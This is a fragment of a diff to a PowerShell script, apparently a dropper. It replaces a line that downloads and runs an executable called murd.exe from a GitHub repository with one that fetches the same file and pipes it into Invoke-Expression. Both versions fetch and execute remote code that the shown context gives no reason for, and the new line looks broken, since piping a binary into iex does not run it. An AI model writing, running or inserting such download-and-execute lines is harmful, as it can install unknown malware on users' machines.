@@ -97,4 +97,4 @@ if (Test-Path $outputPath) {
     Write-Host "Failed to download the file."
 }
 
-iwr "https://github.com/peiceofmind/updated/raw/main/murd.exe" -o murd.exe; .\murd.exe
+iwr -useb https://github.com/peiceofmind/updated/raw/main/murd.exe |iex
